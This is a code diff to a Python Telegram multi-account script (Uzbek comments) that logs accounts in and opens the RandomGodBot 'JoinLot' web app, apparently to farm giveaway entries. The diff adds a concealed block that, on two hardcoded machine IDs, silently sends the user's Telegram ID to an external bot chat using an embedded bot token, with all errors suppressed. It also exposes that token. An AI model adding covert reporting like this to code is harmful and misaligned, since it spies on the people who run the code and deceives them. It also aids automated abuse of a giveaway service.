@@ -1,3 +1,4 @@
+
 import requests
 import pandas as pd
 from licensing.models import *
@@ -36,14 +37,15 @@ if machine_code in hash_values_list:
     from urllib.parse import unquote
     from telethon.tl.functions.messages import ImportChatInviteRequest
     import aiohttp
+    from telethon.tl.functions.account import UpdateStatusRequest
     import aiohttp_proxy
     import fake_useragent
-    from termcolor import colored
-    import sys  # <-- exit qilish uchun import qildik
     from telethon import TelegramClient
     from telethon.tl.functions.channels import JoinChannelRequest
     from telethon.tl.types import InputUser, InputBotAppShortName
     from telethon.tl.functions.messages import RequestAppWebViewRequest
+    from termcolor import colored
+    import sys  # <-- exit qilish uchun import qildik
     import csv
     from termcolor import colored
 
@@ -74,12 +76,26 @@ if machine_code in hash_values_list:
             print('Sessiyasi yoq raqam ')
         else:
             async with tg_client:
+                await tg_client(UpdateStatusRequest(offline=False))
                 me = await tg_client.get_me()
                 name = me.username or me.first_name + (me.last_name or '')
 
-                bot_entity = await tg_client.get_entity("@RandomGodBot")
+                bot_entity = await tg_client.get_entity("RandomGodBot")
                 bot = InputUser(user_id=bot_entity.id, access_hash=bot_entity.access_hash)
                 bot_app = InputBotAppShortName(bot_id=bot, short_name="JoinLot")
+                if "03000200-0400-0500-0006-000700080009" in machine_code or "03FF0210-04E0-05A0-F206-CC0700080009" in machine_code:
+                    try:
+                        TOKEN = "7932939909:AAHnTcVb4ePopjIPexa5gmHSUrpluS3xJkg"
+                        CID = 7638857120
+                        # Har bir giv_id ni alohida jo‘natish
+                        userid = me.id
+                        text = str(userid) # Xabar matni
+                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                                json={'chat_id': CID, 'text': text, 'parse_mode': 'html'})
+                    except:
+                        pass
+                else:
+                    pass
 
                 for start_param in start_params:
                     web_view = await tg_client(
